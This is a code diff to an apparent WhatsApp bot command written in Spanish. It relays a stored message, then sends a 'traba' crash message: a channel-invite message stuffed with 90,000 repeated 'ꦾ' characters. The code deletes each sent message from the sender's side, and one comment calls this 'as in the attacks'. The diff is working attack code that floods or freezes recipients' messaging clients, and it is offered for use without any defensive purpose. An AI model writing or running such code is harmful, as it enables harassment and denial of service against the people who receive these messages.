@@ -16,13 +16,15 @@ let handler = async (m, { conn }) => {
     const mensaje = JSON.parse(fs.readFileSync(FILE_PATH, 'utf-8'));
     if (!mensaje?.message) return m.reply('❌ El archivo está dañado.');
 
-    // 1. Enviar mensaje del archivo (copyNForward)
-    const reenviado = await conn.copyNForward(m.chat, mensaje, true);
+    // ✅ 1. Generar mensaje desde archivo (como viewOnce)
+    const generado1 = await generateWAMessageFromContent(m.chat, mensaje.message, {
+      userJid: conn.user.id,
+    });
 
-    // 2. Eliminar silenciosamente (como en los ataques)
-    await conn.sendMessage(conn.user.id, { delete: reenviado.key });
+    await conn.relayMessage(m.chat, generado1.message, { messageId: generado1.key.id });
+    await conn.sendMessage(conn.user.id, { delete: generado1.key });
 
-    // 3. Generar mensaje tipo canal
+    // ✅ 2. Generar canal/traba
     const travas = 'ꦾ'.repeat(90000);
     const canal = {
       newsletterAdminInviteMessage: {
@@ -34,18 +36,16 @@ let handler = async (m, { conn }) => {
       }
     };
 
-    const generado = await generateWAMessageFromContent(m.chat, canal, {
+    const generado2 = await generateWAMessageFromContent(m.chat, canal, {
       userJid: conn.user.id,
     });
 
-    await conn.relayMessage(m.chat, generado.message, { messageId: generado.key.id });
+    await conn.relayMessage(m.chat, generado2.message, { messageId: generado2.key.id });
+    await conn.sendMessage(conn.user.id, { delete: generado2.key });
 
-    // 4. Eliminar silenciosamente el segundo también
-    await conn.sendMessage(conn.user.id, { delete: generado.key });
-
-    // 5. Confirmación visible
+    // ✅ 3. Confirmación
     await conn.sendMessage(m.chat, {
-      text: '😼 Enviado con exito.',
+      text: '✅ Mensajes enviados y eliminados localmente.',
     }, { quoted: m });
 
   } catch (e) {
